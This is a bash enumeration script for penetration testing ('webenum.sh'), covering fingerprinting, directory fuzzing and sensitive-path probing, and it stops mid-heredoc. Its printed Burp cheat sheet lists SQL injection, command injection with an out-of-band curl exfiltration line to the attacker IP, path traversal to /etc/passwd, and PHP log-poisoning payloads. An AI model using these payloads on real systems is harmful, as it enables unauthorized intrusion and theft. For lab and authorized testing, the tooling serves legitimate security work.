#!/usr/bin/env bash
#==============================================================================
# WEBENUM — Deep Web Enumeration Wrapper
#==============================================================================
# Designed to run AFTER recon.sh, which performs a quick HTTP pass
# (whatweb, curl, robots.txt, nikto, gobuster with dirbuster-medium).
#
# This script goes deeper:
#   Phase 1 — Technology fingerprinting (whatweb aggressive, headers, cookies)
#   Phase 2 — Directory/file fuzzing with larger wordlists + extension targeting
#   Phase 3 — Recursive fuzzing on interesting paths
#   Phase 4 — Virtual host / subdomain fuzzing
#   Phase 5 — Parameter discovery on found endpoints
#   Phase 6 — Content analysis + summary generation
#
# DESIGN:
#   - Mirrors recon.sh conventions (colors, logging, progress, cleanup)
#   - Single file — nothing to lose on engagement day
#   - Enumeration only — no exploitation, OffSec compliant
#   - Timeouts on everything — nothing hangs the engagement
#   - Graceful degradation — skips tools that aren't installed
#   - Resume support — re-run safely; skips completed phases
#   - Wildcard-aware fingerprinting — servers that 200/301 on every path
#     (e.g. Mezzanine/Django wildcard catch-alls) previously produced a
#     dozen false positives (bogus Joomla/Tomcat/Jenkins/etc). All CMS
#     and framework detections now require body-level marker corroboration
#     via _confirm_fingerprint() before emitting next-step commands.
#
# USAGE:
#   ./webenum.sh --url http://10.10.10.5           # single URL
#   ./webenum.sh --url http://10.10.10.5:8080      # non-standard port
#   ./webenum.sh --url https://10.10.10.5          # HTTPS
#   ./webenum.sh --url http://10.10.10.5 --deep    # full recursive + param fuzzing
#   ./webenum.sh --url http://10.10.10.5 --vhost target.htb  # vhost fuzzing
#   ./webenum.sh --url http://10.10.10.5 --root ~/pg         # custom output root
#
# OUTPUT:
#   <root>/<host>_<port>_<proto>/artifacts/
#     fingerprint/          whatweb, headers, cookies, source hints
#     content/              directory + file fuzzing results
#     content/recursive/    recursive ffuf on interesting paths (--deep)
#     vhosts/               vhost fuzzing results
#     params/               parameter discovery (--deep)
#     summary/
#       summary.md          READ THIS FIRST — structured findings
#       summary.txt         Plain-text alias of summary.md
#       quick_wins.txt      high-value lines: 200s, auth prompts, interesting paths
#==============================================================================

set -o pipefail
# NOT set -e — handle errors individually; one failure must not kill the run

#==============================================================================
# CONFIGURATION
#==============================================================================
# Absolute dir of this script — used to emit PWD-independent commands that
# reference sibling toolkit scripts (sprayr.sh, crackr.sh, etc.).
# shellcheck disable=SC2034  # reserved for sibling-command emission
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

if [[ -z "${TOOLKIT_ROOT:-}" ]]; then
    if [[ -n "${SUDO_USER:-}" ]]; then
        _inv_home=$(getent passwd "$SUDO_USER" 2>/dev/null | cut -d: -f6)
        TOOLKIT_ROOT="${_inv_home:-$HOME}/offsec"
        unset _inv_home
    else
        TOOLKIT_ROOT="${HOME}/offsec"
    fi
fi
OUTPUT_ROOT="${TOOLKIT_ROOT}/web"
THREADS=40
FFUF_TIMEOUT=30                      # per-request timeout (seconds)
FFUF_RATE=0                          # 0 = no rate limit; set to e.g. 100 to throttle
FFUF_AUTOCALIBRATE=false             # Opt-in with --ffuf-ac; can over-filter odd apps
WHATWEB_TIMEOUT=60
CURL_TIMEOUT=15
PHASE_FINGERPRINT_TIMEOUT=120
PHASE_CONTENT_TIMEOUT=900            # 15 min — large wordlists take time
PHASE_RECURSIVE_TIMEOUT=600
PHASE_VHOST_TIMEOUT=600
PHASE_PARAM_TIMEOUT=300

DEEP_MODE=false
VHOST_DOMAIN=""                      # e.g. "target.htb" — enables vhost fuzzing
JS_FETCH_LIMIT=30                    # Keep JavaScript review useful without turning into crawling

# Wordlists — ordered fast→slow within each phase
WL_DIR_FAST="/usr/share/wordlists/dirb/common.txt"
WL_DIR_MEDIUM="/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt"
WL_DIR_LARGE="/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt"
WL_DIR_DIRBUSTER="/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"

WL_FILES_MEDIUM="/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt"

WL_VHOSTS="/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
WL_PARAMS="/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt"

# Extensions targeted per tech stack — auto-detected where possible
EXT_WINDOWS="asp,aspx,ashx,asmx,config,txt,bak"
EXT_JAVA="jsp,jspx,do,action,xml,properties,war"
EXT_GENERIC="php,html,txt,js,json,xml,conf,bak,old,zip,tar,gz,sql,log,env"

#==============================================================================
# COLORS & LOGGING
#==============================================================================
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
BOLD='\033[1m'
NC='\033[0m'

disable_colors() { RED='' GREEN='' YELLOW='' BLUE='' CYAN='' MAGENTA='' BOLD='' NC=''; }
{ [[ -n "${NO_COLOR:-}" ]] || [[ ! -t 1 ]]; } && disable_colors

# Validate an IPv4 address (4 dotted octets, each 0-255).
is_valid_ip() {
    local ip="$1"
    [[ "$ip" =~ ^[0-9]{1,3}(\.[0-9]{1,3}){3}$ ]] || return 1
    local octet
    local IFS='.'
    local -a octets
    read -ra octets <<< "$ip"
    for octet in "${octets[@]}"; do
        (( 10#$octet <= 255 )) || return 1
    done
}

# Auto-detect Kali IP for reverse shell commands printed during enumeration
KALI_IP=$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)
[[ -z "$KALI_IP" ]] && KALI_IP=$(ip -4 addr show eth0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)
[[ -z "$KALI_IP" ]] && KALI_IP="<KALI_IP>"

ts()      { date '+%H:%M:%S'; }
info()    { echo -e "${BLUE}[$(ts)] [*]${NC} $*"; }
success() { echo -e "${GREEN}[$(ts)] [+]${NC} $*"; }
warn()    { echo -e "${YELLOW}[$(ts)] [!]${NC} $*"; }
error()   { echo -e "${RED}[$(ts)] [-]${NC} $*"; }
header()  { echo -e "\n${BOLD}${CYAN}═══════════════════════════════════════════════════${NC}";
            echo -e "${BOLD}${CYAN}  $*${NC}";
            echo -e "${BOLD}${CYAN}═══════════════════════════════════════════════════${NC}"; }
phase()       { echo -e "\n${MAGENTA}[$(ts)] [PHASE]${NC} ${BOLD}$*${NC}"; }

# Delete output files that hold nothing useful, so the operator isn't opening
# empty placeholders during an engagement. A file is "useless" when:
#   (1) zero bytes, or
#   (2) body begins with '<' (HTML error page) — but keep '<?xml' (real sitemap), or
#   (3) every non-blank line starts with '#' (header-only text, no findings).
# Applied to .txt/.json/.xml/.html files in the phase output dir (one level deep).
_prune_useless_files() {
    local dir="$1"
    [[ -d "$dir" ]] || return 0
    local f first16
    while IFS= read -r -d '' f; do
        if [[ ! -s "$f" ]]; then
            rm -f "$f"
            continue
        fi
        first16=$(head -c 64 "$f" 2>/dev/null | tr -d '[:space:]' | head -c 16)
        case "$first16" in
            '<?xml'*|'<?XML'*) continue ;;
            '<'*) rm -f "$f"; continue ;;
        esac
        # grep -qvE returns success (0) if ANY non-blank, non-comment line exists.
        # If no such line -> delete the file.
        if ! grep -qvE '^\s*(#|$)' "$f" 2>/dev/null; then
            rm -f "$f"
        fi
    done < <(find "$dir" -maxdepth 2 -type f \
        \( -name '*.txt' -o -name '*.json' -o -name '*.xml' -o -name '*.html' \) \
        -print0 2>/dev/null)
    # Also drop empty subdirectories left behind (e.g. fingerprint/js/ when no JS).
    find "$dir" -mindepth 1 -type d -empty -delete 2>/dev/null || true
}

# Heartbeat: emit a progress line every 30s so the operator can distinguish
# "still working" from "stuck" during long-running ffuf/whatweb commands.
_HEARTBEAT_PID=""
_start_heartbeat() {
    # $1=tool, $2=ctx, $3=budget_sec
    local tool="$1" ctx="$2" budget="$3"
    local start
    start=$(date +%s)
    (
        while true; do
            sleep 30
            local now el
            now=$(date +%s)
            el=$(( now - start ))
            if (( el >= budget )); then
                echo -e "${YELLOW}[$(ts)] [~]${NC} ${tool} still running — over budget (${el}s / ${budget}s) → ${ctx}"
            else
                echo -e "${CYAN}[$(ts)] [~]${NC} ${tool} running (${el}s / ${budget}s) → ${ctx}"
            fi
        done
    ) &
    _HEARTBEAT_PID=$!
}
_stop_heartbeat() {
    if [[ -n "${_HEARTBEAT_PID:-}" ]]; then
        kill "$_HEARTBEAT_PID" 2>/dev/null || true
        wait "$_HEARTBEAT_PID" 2>/dev/null || true
        _HEARTBEAT_PID=""
    fi
}
_tool_start() {
    echo -e "${CYAN}[$(ts)] [~]${NC} ${BOLD}$1${NC} → $2  ${YELLOW}(budget: $3)${NC}"
    local _budget_sec
    _budget_sec=$(echo "$3" | grep -oE '^[0-9]+' | head -n1)
    if [[ -n "$_budget_sec" ]] && (( _budget_sec >= 60 )); then
        _start_heartbeat "$1" "$2" "$_budget_sec"
    fi
}
_tool_done() {
    _stop_heartbeat
    local _e=$(( $(date +%s) - $2 ))
    echo -e "${GREEN}[$(ts)] [✓]${NC} $1 done — ${_e}s"
}

#==============================================================================
# PROGRESS TRACKING (mirrors recon.sh)
#==============================================================================
progress_log() {
    local logfile="$1/progress.log"
    echo "$(date '+%Y-%m-%d %H:%M:%S') | $2 | $3 | $4" >> "$logfile"
}

is_phase_done() {
    grep -q "| DONE | $2 |" "$1/progress.log" 2>/dev/null
}

#==============================================================================
# CHILD PROCESS MANAGEMENT
#==============================================================================
declare -a CHILD_PIDS=()

register_pid() { CHILD_PIDS+=("$1"); }

wait_all() {
    if (( ${#CHILD_PIDS[@]} > 0 )); then
        local _total=${#CHILD_PIDS[@]}
        info "Waiting for $_total background job(s) to finish..."
        local _w0
        _w0=$(date +%s)
        local _last_report=0
        while (( ${#CHILD_PIDS[@]} > 0 )); do
            local _alive=()
            local _pid
            for _pid in "${CHILD_PIDS[@]}"; do
                if kill -0 "$_pid" 2>/dev/null; then
                    _alive+=("$_pid")
                else
                    wait "$_pid" 2>/dev/null || true
                fi
            done
            CHILD_PIDS=("${_alive[@]+"${_alive[@]}"}")
            (( ${#CHILD_PIDS[@]} == 0 )) && break
            local _el=$(( $(date +%s) - _w0 ))
            if (( _el - _last_report >= 30 )); then
                info "  ${#CHILD_PIDS[@]}/${_total} job(s) still running... (${_el}s elapsed)"
                _last_report=$_el
            fi
            sleep 2
        done
        local _waited=$(( $(date +%s) - _w0 ))
        (( _waited > 2 )) && success "All background jobs finished (waited ${_waited}s)"
    fi
    CHILD_PIDS=()
}

CLEANUP_RUNNING=0

cleanup() {
    local exit_code="${1:-0}"
    (( CLEANUP_RUNNING )) && return
    CLEANUP_RUNNING=1
    trap - EXIT INT TERM

    if [[ -n "${_HEARTBEAT_PID:-}" ]]; then
        kill "$_HEARTBEAT_PID" 2>/dev/null || true
        _HEARTBEAT_PID=""
    fi

    if (( ${#CHILD_PIDS[@]} > 0 )); then
        local pid
        for pid in "${CHILD_PIDS[@]}"; do
            kill -TERM "$pid" 2>/dev/null || true
        done
        sleep 1
        for pid in "${CHILD_PIDS[@]}"; do
            kill -9 "$pid" 2>/dev/null || true
        done
    fi

    if (( exit_code == 130 )); then
        echo ""
        warn "Interrupted — partial results saved in ${OUTPUT_DIR:-[not initialized]}/"
    fi
    exit "$exit_code"
}

trap 'cleanup 0'   EXIT
trap 'cleanup 130' INT TERM

#==============================================================================
# TOOL CHECK
#==============================================================================
check_tool() {
    command -v "$1" &>/dev/null
}

httpx_tool() {
    if command -v httpx-toolkit &>/dev/null; then
        echo "httpx-toolkit"
    elif command -v httpx &>/dev/null; then
        echo "httpx"
    else
        return 1
    fi
}

require_tool() {
    if ! check_tool "$1"; then
        error "Required tool missing: $1"
        return 1
    fi
    return 0
}

check_wordlist() {
    # Returns the first wordlist in the list that actually exists
    # Usage: wl=$(check_wordlist "$WL_DIR_MEDIUM" "$WL_DIR_FAST")
    for wl in "$@"; do
        if [[ -f "$wl" ]]; then
            echo "$wl"
            return 0
        fi
    done
    warn "No wordlist found from candidates: $*"
    return 1
}

is_positive_integer() {
    [[ "$1" =~ ^[1-9][0-9]*$ ]]
}

is_nonnegative_integer() {
    [[ "$1" =~ ^[0-9]+$ ]]
}

is_nonempty_file() {
    [[ -f "$1" && -s "$1" ]]
}

append_next_finding() {
    local next_file="$1"
    local title="$2"
    local evidence="$3"
    shift 3

    {
        echo "## ${title}"
        echo "Evidence: ${evidence}"
        local cmd
        for cmd in "$@"; do
            [[ -n "$cmd" ]] && echo "$cmd"
        done
        echo ""
    } >> "$next_file"
}

# Why: wordlist/sensitive-path keyword matches produce floods of false positives on
# hosts that wildcard-respond (e.g. nginx catch-all 301). This helper fetches a
# candidate path, then requires the response body/headers to contain a service-
# specific marker before a fingerprint is accepted. Callers chain with || to try
# multiple probe paths.
# Args: $1=base_url  $2=probe_path  $3=marker_regex  [$4=status_regex (default 200|301|302|401|403)]
# Returns 0 if status acceptable AND marker found in response (headers+body).
_confirm_fingerprint() {
    local base_url="$1"
    local probe_path="$2"
    local marker="$3"
    local ok_status="${4:-200|301|302|401|403}"
    local url="${base_url%/}${probe_path}"
    local hdr_tmp body_tmp status rc
    hdr_tmp=$(mktemp) || return 1
    body_tmp=$(mktemp) || { rm -f "$hdr_tmp"; return 1; }
    status=$(timeout 6 curl -sk -A 'Mozilla/5.0' --max-time 5 \
        -D "$hdr_tmp" -o "$body_tmp" -w '%{http_code}' "$url" 2>/dev/null || echo "")
    if ! [[ "$status" =~ ^(${ok_status})$ ]]; then
        rm -f "$hdr_tmp" "$body_tmp"
        return 1
    fi
    # Strip headers that reflect the probe path (Location on 301/302 trailing-slash
    # redirects contains e.g. "/adminer.php/", which would self-match "Adminer" —
    # a real false positive seen on nginx against 192.168.227.62).
    { grep -v -iE '^(Location|Content-Location|Refresh|Link):' "$hdr_tmp" 2>/dev/null
      head -c 20000 "$body_tmp" 2>/dev/null; } | grep -qiE "$marker"
    rc=$?
    rm -f "$hdr_tmp" "$body_tmp"
    return $rc
}

# Why: when the target returns the same (status,size,words,lines) tuple to a
# known-non-existent path, every ffuf result matches that tuple — a carpet of
# false "hits". This helper reads the baseline file and drops rows matching it.
# Args: $1=ffuf_text_file  $2=baseline_file
_drop_wildcard_ffuf_rows() {
    local ffuf_file="$1"
    local baseline="$2"
    [[ -s "$ffuf_file" && -s "$baseline" ]] || return 0
    local b_status b_size
    b_status=$(awk -F= '/^status=/ {gsub(/ .*/,"",$2); print $2; exit}' "$baseline" 2>/dev/null)
    b_size=$(awk '/^status=/ {for (i=1;i<=NF;i++) if ($i ~ /^size=/) {sub(/size=/,"",$i); print $i; exit}}' "$baseline" 2>/dev/null)
    [[ -n "$b_status" && -n "$b_size" ]] || return 0
    # ffuf text row format: "FUZZTERM URL | STATUS | SIZE | WORDS | LINES".
    # Line 1 is the column header, line 2 is the dashed separator — keep both.
    # Previous regex /^(FUZZ|URL|-)/ leaked real matches whose fuzz term started
    # with URL (e.g. URLrewrite, URL_Picker) because the row literally begins
    # with "URL". We now gate on line number + a numeric-status check.
    awk -v s="$b_status" -v sz="$b_size" -F'|' '
        NR <= 2 { print; next }
        /^-+$/ { print; next }
        $2 !~ /^[[:space:]]*[0-9]+[[:space:]]*$/ { print; next }
        NF < 3 { print; next }
        {
            st=$2; si=$3;
            gsub(/ /,"",st); gsub(/ /,"",si);
            if (st == s && si == sz) next;
            print
        }' "$ffuf_file" > "${ffuf_file}.tmp" && mv "${ffuf_file}.tmp" "$ffuf_file"
}

#==============================================================================
# URL PARSING HELPERS
#==============================================================================
get_proto() {
    # Extract http or https from URL
    echo "$1" | grep -oP '^https?'
}

get_host() {
    # Extract host (no port, no path) from URL
    echo "$1" | sed 's|https\?://||' | cut -d'/' -f1 | cut -d':' -f1
}

get_port() {
    local url="$1"
    local proto=""
    proto=$(get_proto "$url")
    # Check for explicit port
    if echo "$url" | grep -qP ':\d+'; then
        echo "$url" | sed 's|https\?://||' | cut -d'/' -f1 | cut -d':' -f2
    else
        [[ "$proto" == "https" ]] && echo "443" || echo "80"
    fi
}

get_base_url() {
    # Strip trailing path — return proto://host:port
    local url="$1"
    echo "$url" | grep -oP '^https?://[^/]+'
}

normalize_url_ref() {
    local base="$1"
    local ref="$2"
    local origin=""
    origin=$(get_base_url "$base")

    case "$ref" in
        http://*|https://*) echo "$ref" ;;
        //*) echo "$(get_proto "$base"):${ref}" ;;
        /*) echo "${origin}${ref}" ;;
        *) echo "${base%/}/${ref}" ;;
    esac
}

detect_tech() {
    # Returns rough tech stack hint from whatweb output for extension selection
    local whatweb_file="$1"
    if [[ ! -f "$whatweb_file" ]]; then echo "generic"; return; fi
    if grep -qi "ASP.NET\|IIS\|Windows" "$whatweb_file"; then
        echo "windows"
    elif grep -qi "Tomcat\|Struts\|Spring\|JBoss\|Jenkins\|Java" "$whatweb_file"; then
        echo "java"
    elif grep -qi "PHP\|WordPress\|Joomla\|Drupal" "$whatweb_file"; then
        echo "php"
    else
        echo "generic"
    fi
}

get_extensions() {
    local tech="$1"
    case "$tech" in
        windows) echo "$EXT_WINDOWS" ;;
        java)    echo "$EXT_JAVA" ;;
        php)     echo "php,html,txt,bak,old,conf,xml,json,sql,log,zip" ;;
        *)       echo "$EXT_GENERIC" ;;
    esac
}

#==============================================================================
# PHASE 1 — FINGERPRINTING
#==============================================================================
phase_fingerprint() {
    local url="$1"
    local outdir="$2/fingerprint"

    local phase_name="fingerprint"
    if is_phase_done "$2" "$phase_name"; then
        info "Fingerprinting already done — skipping"
        return 0
    fi
    mkdir -p "$outdir"
    progress_log "$2" "START" "$phase_name" "url=$url"
    phase "Phase 1 — Fingerprinting: $url"

    # --- WhatWeb aggressive ---
    if check_tool whatweb; then
        _tool_start "whatweb" "$url" "${WHATWEB_TIMEOUT}s"
        local _ww_t0
        _ww_t0=$(date +%s)
        timeout "$WHATWEB_TIMEOUT" whatweb -a 3 --color never "$url" \
            > "$outdir/whatweb.txt" 2>&1 || true
        # Also run in verbose mode for plugin detail
        timeout "$WHATWEB_TIMEOUT" whatweb -a 3 -v --color never "$url" \
            > "$outdir/whatweb_verbose.txt" 2>&1 || true
        _tool_done "whatweb" "$_ww_t0"
    fi

    # --- Full HTTP headers (follow redirects) ---
    info "  → curl headers (follow redirects)"
    timeout "$CURL_TIMEOUT" curl -skIL \
        --max-redirs 5 \
        -A "Mozilla/5.0 (X11; Linux x86_64)" \
        "$url" > "$outdir/headers.txt" 2>&1 || true

    # --- HTTP methods (stored for finding-driven next steps) ---
    info "  → HTTP OPTIONS methods"
    timeout "$CURL_TIMEOUT" curl -skIX OPTIONS \
        -A "Mozilla/5.0 (X11; Linux x86_64)" \
        "$url" > "$outdir/http_methods.txt" 2>&1 || true

    # --- TLS/WAF context ---
    if [[ "$(get_proto "$url")" == "https" ]]; then
        if check_tool sslscan; then
            info "  → sslscan"
            timeout "$PHASE_FINGERPRINT_TIMEOUT" sslscan "$(get_host "$url"):$(get_port "$url")" \
                > "$outdir/sslscan.txt" 2>&1 || true
        fi
        if check_tool openssl; then
            info "  → TLS certificate names"
            # shellcheck disable=SC2016
            timeout 20 bash -c '
                echo | openssl s_client -connect "$1:$2" -servername "$1" 2>/dev/null |
                    openssl x509 -noout -subject -issuer -dates -ext subjectAltName 2>/dev/null
            ' -- "$(get_host "$url")" "$(get_port "$url")" > "$outdir/tls_certificate.txt" 2>&1 || true
            grep -oP 'DNS:\K[^,\s]+' "$outdir/tls_certificate.txt" 2>/dev/null | sort -u > "$outdir/tls_names.txt" || true
        fi
    fi
    if check_tool wafw00f; then
        info "  → wafw00f"
        timeout "$PHASE_FINGERPRINT_TIMEOUT" wafw00f "$url" > "$outdir/wafw00f.txt" 2>&1 || true
    fi
    local httpx_cmd=""
    httpx_cmd=$(httpx_tool 2>/dev/null || true)
    if [[ -n "$httpx_cmd" ]]; then
        info "  → httpx technology probe"
        # shellcheck disable=SC2016
        timeout "$PHASE_FINGERPRINT_TIMEOUT" bash -c '
            printf "%s\n" "$1" | "$3" -silent -status-code -title -tech-detect \
                -web-server -content-length -location -json -o "$2"
        ' -- "$url" "$outdir/httpx.json" "$httpx_cmd" > "$outdir/httpx_console.txt" 2>&1 || true
    fi

    # --- Homepage source (first 500 lines) ---
    info "  → fetching homepage source"
    timeout "$CURL_TIMEOUT" curl -sk \
        -A "Mozilla/5.0 (X11; Linux x86_64)" \
        "$url" 2>/dev/null | head -500 > "$outdir/homepage_source.html" || true

    # --- Extract comments and hints from source ---
    info "  → extracting source hints (comments, paths, emails)"
    {
        echo "=== HTML Comments ==="
        grep -oP '<!--.*?-->' "$outdir/homepage_source.html" 2>/dev/null | head -20

        echo ""
        echo "=== Relative Paths Found ==="
        grep -oP '(?:href|src|action)=["\x27][^"'\''#>]{3,}' \
            "$outdir/homepage_source.html" 2>/dev/null | \
            grep -v 'http' | sort -u | head -30

        echo ""
        echo "=== Emails Found ==="
        grep -oP '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' \
            "$outdir/homepage_source.html" 2>/dev/null | sort -u

        echo ""
        echo "=== Version Strings ==="
        grep -oiP 'version["\s:=]+[\d.]+' "$outdir/homepage_source.html" 2>/dev/null | \
            sort -u | head -20
    } > "$outdir/source_hints.txt" 2>/dev/null

    # --- JavaScript asset review: endpoints, source maps, and secret-looking hints ---
    info "  → extracting JavaScript asset hints"
    mkdir -p "$outdir/js"
    python3 - "$url" "$outdir/homepage_source.html" "$outdir/js_urls.txt" <<'PYEOF' 2>/dev/null || true
import sys
from html.parser import HTMLParser
from urllib.parse import urljoin

base, html_path, out_path = sys.argv[1:4]

class JSParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.urls = []
    def handle_starttag(self, tag, attrs):
        attrs = dict(attrs)
        for key in ("src", "href"):
            value = attrs.get(key)
            if value and ".js" in value.lower():
                self.urls.append(urljoin(base.rstrip("/") + "/", value))

parser = JSParser()
try:
    with open(html_path, "r", encoding="utf-8", errors="ignore") as handle:
        parser.feed(handle.read())
except OSError:
    pass
seen = []
for item in parser.urls:
    clean = item.split("#", 1)[0]
    if clean not in seen:
        seen.append(clean)
with open(out_path, "w", encoding="utf-8") as handle:
    for item in seen[:50]:
        handle.write(item + "\n")
PYEOF
    local js_count=0
    local js_url=""
    while IFS= read -r js_url; do
        [[ -z "$js_url" ]] && continue
        (( js_count++ )) || true
        (( js_count > JS_FETCH_LIMIT )) && break
        local js_safe
        js_safe=$(echo "$js_url" | sed 's|https\?://||;s|[^A-Za-z0-9._-]|_|g' | cut -c1-120)
        [[ -z "$js_safe" ]] && js_safe="asset_${js_count}"
        timeout "$CURL_TIMEOUT" curl -sk "$js_url" -o "$outdir/js/${js_safe}.js" 2>/dev/null || true
    done < "$outdir/js_urls.txt"
    find "$outdir/js" -type f -name '*.js' -print 2>/dev/null | while IFS= read -r js_file; do
        grep -hEo '(/[A-Za-z0-9._~:/?#\[\]@!$&'\''()*+,;=%-]{3,})' "$js_file" 2>/dev/null || true
    done | sort -u > "$outdir/js_endpoints.txt"
    # Why: bare keyword grep floods on framework code — jQuery's "input:password"
    # selector, Bootstrap's "autoToken" variable, etc. Two filters applied:
    # (1) filename blocklist for well-known libraries (case-insensitive basename);
    # (2) pattern must look like an assignment with a quoted literal of >=6 chars,
    # or match a high-entropy API-key shape (OpenAI sk-, AWS AKIA, JWT).
    {
        find "$outdir/js" -type f -name '*.js' -print 2>/dev/null | while IFS= read -r js_file; do
            base=$(basename "$js_file")
            case "${base,,}" in
                jquery*|bootstrap*|angular*|react*|vue*|ember*|backbone*|lodash*|underscore*|moment*|popper*|d3*|chart*|highcharts*|swagger-ui*|modernizr*|prototype*|mootools*|dojo*|ext*)
                    continue ;;
            esac
            grep -hnE '(api[_-]?key|token|secret|password|authorization|bearer|client[_-]?secret|aws[_-]?(access[_-]?key|secret)?|s3[_-]?secret|jdbc:|mongodb://[^[:space:]]*:)[^A-Za-z0-9]{0,4}[:=][^A-Za-z0-9]{0,4}["'\''][^"'\'']{6,}["'\'']' "$js_file" 2>/dev/null || true
            grep -hnEo '(sk-[A-Za-z0-9]{20,}|AKIA[0-9A-Z]{16}|eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)' "$js_file" 2>/dev/null || true
        done
    } | head -100 > "$outdir/js_secret_hints.txt"
    find "$outdir/js" -type f -name '*.js' -print 2>/dev/null | while IFS= read -r js_file; do
        grep -hEo 'sourceMappingURL=[^[:space:]]+' "$js_file" 2>/dev/null | sed 's/^sourceMappingURL=//' || true
    done | sort -u > "$outdir/js_source_maps.txt"

    # --- robots.txt / sitemap.xml / security.txt ---
    # Empty/404 responses are pruned by _prune_useless_files at phase end.
    info "  → robots.txt"
    timeout "$CURL_TIMEOUT" curl -sk "${url%/}/robots.txt" > "$outdir/robots.txt" 2>&1 || true
    info "  → sitemap.xml"
    timeout "$CURL_TIMEOUT" curl -sk "${url%/}/sitemap.xml" > "$outdir/sitemap.xml" 2>&1 || true
    info "  → security.txt"
    timeout "$CURL_TIMEOUT" curl -sk "${url%/}/.well-known/security.txt" \
        > "$outdir/security_txt.txt" 2>&1 || true

    # --- Check for common sensitive paths directly ---
    # Why: before probing, check if the server wildcards unknown paths (returns a
    # "findable" code to every request — e.g. nginx catch-all 301). If so, the
    # probe can't distinguish real hits from noise, so suppress the list to avoid
    # feeding false positives into downstream fingerprint greps.
    info "  → probing common sensitive paths"
    local wildcard_path wildcard_status
    wildcard_path="/$(tr -dc 'a-z' </dev/urandom 2>/dev/null | head -c 16)-nope"
    wildcard_status=$(timeout 5 curl -sk -o /dev/null -w '%{http_code}' \
        -A 'Mozilla/5.0' --max-time 5 "${url%/}${wildcard_path}" 2>/dev/null || echo "ERR")
    if echo "$wildcard_status" | grep -qE '^(200|301|302|401|403)$'; then
        {
            echo "# Sensitive path probes — SUPPRESSED"
            echo "# Wildcard detected: server returns HTTP $wildcard_status to random path ${wildcard_path}"
            echo "# Every probe would match the wildcard, so results are indistinguishable from noise."
            echo "# Fingerprint detection falls back to body-level confirmation (see next_steps.txt)."
        } > "$outdir/sensitive_paths.txt"
    else
        # shellcheck disable=SC2016  # $1 is expanded by the inner bash -c
        timeout "$PHASE_FINGERPRINT_TIMEOUT" bash -c '
            url="$1"
            echo "# Sensitive path probes — 200/301/302/401/403 = potentially interesting"
            echo ""
            for path in \
                "/.git/HEAD" "/.git/config" "/.env" "/.htaccess" "/.htpasswd" \
                "/web.config" "/config.php" "/configuration.php" "/wp-config.php" \
                "/phpinfo.php" "/.DS_Store" "/backup.zip" "/backup.tar.gz" \
                "/admin" "/administrator" "/login" "/wp-admin" "/manager" \
                "/phpmyadmin" "/adminer" "/console" "/api" "/api/v1" \
                "/swagger.json" "/swagger-ui" "/openapi.json" \
                "/_profiler" "/debug" "/.well-known"; do
                resp=$(timeout 5 curl -sk -o /dev/null -w "%{http_code}" \
                    -A "Mozilla/5.0" "${url%/}${path}" 2>/dev/null || echo "ERR")
                if echo "$resp" | grep -qE "^(200|301|302|401|403)$"; then
                    echo "  [${resp}] ${url%/}${path}"
                fi
            done
        ' -- "$url" > "$outdir/sensitive_paths.txt" 2>&1 || warn "Sensitive path probing timed out"
    fi

    # --- Operator workflow notes grounded in this target URL ---
    {
        local host_only port_only
        host_only=$(get_host "$url")
        port_only=$(get_port "$url")
        cat <<BURP
# Burp Suite workflow for $url
# Kali IP: $KALI_IP   (substituted below; update if wrong)

[1] SETUP
    Browser proxy:   127.0.0.1:8080   (Burp default)
    Target > Scope > add:  $url         (Advanced scope control: ON)
    Proxy > Options > Intercept: OFF initially   (let everything flow through)
    Install extensions (BApp Store): Logger++, Active Scan++, Param Miner,
                                     Turbo Intruder, JWT Editor, Autorize, Hackvertor

[2] MAP THE APP (~5 min)
    Click every link + submit every form with junk data.
    Target > Site map > right-click $host_only > Engagement tools > Analyze Target
        (shows params, cookies, hidden fields).
    Also run the built-in crawl: Target > right-click host > Scan > Crawl only.

[3] SEND THESE TO REPEATER (Ctrl-R on each)
    - Every form: /login, /search, /upload, /contact, /comment, /register
    - Every URL with a param: ?id= ?page= ?file= ?url= ?redirect= ?cmd= ?template=
    - Every request carrying JWT/session cookie
    - Any authenticated endpoint  (then compare to anon — Comparer)

[4] ATTACKS BY PARAM TYPE  (test in Repeater; then Intruder for lists)

  SQL injection (login, search, id params):
    '   "   ' OR '1'='1-- -     admin'-- -     ") OR ("1"="1
    ') OR 1=1-- -                # closes parenthesized query
    UNION-based:  ' UNION SELECT NULL,NULL-- -   (increment NULLs to match col count)
    Time-based:   ' AND SLEEP(5)-- -    " AND (SELECT SLEEP(5))-- -
    Intruder Sniper wordlist:  /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt
    Or drop to sqlmap once a param looks vulnerable:
      sqlmap -u "$url/path?id=1" --batch --dbs --level=3 --risk=2
      sqlmap -r req.txt --batch --dbs   # if cookies/POST matter

  Command injection (ping, lookup, filename, download params):
    ;id   |id   \`id\`   \$(id)   %0aid   ||id   && id
    blind (no output):  ;sleep 5    \`sleep 5\`
    OOB (detect + exfil):
      ;curl http://$KALI_IP/\$(whoami)
      Then on Kali:  python3 -m http.server 80

  LFI / path traversal (file, page, template, lang params):
    ../../../../etc/passwd          (5-8 levels of ../ is typical)
    ....//....//....//etc/passwd    (double-dot bypass)
    %2e%2e%2fetc%2fpasswd           (URL-encoded)
    php://filter/convert.base64-encode/resource=index   (PHP source read)
    Windows:  ../../../../windows/system32/drivers/etc/hosts
    Log poisoning (LFI -> RCE):
      1. Send:  GET / HTTP/1.1  with  User-Agent: <?php system(\$_GET['c']); ?>
      2. Read:  ?file=/var/log/apache2/access.log&c=id
               or /var/log/nginx/access.log, /proc/self/environ (if readable)

  Auth bypass:
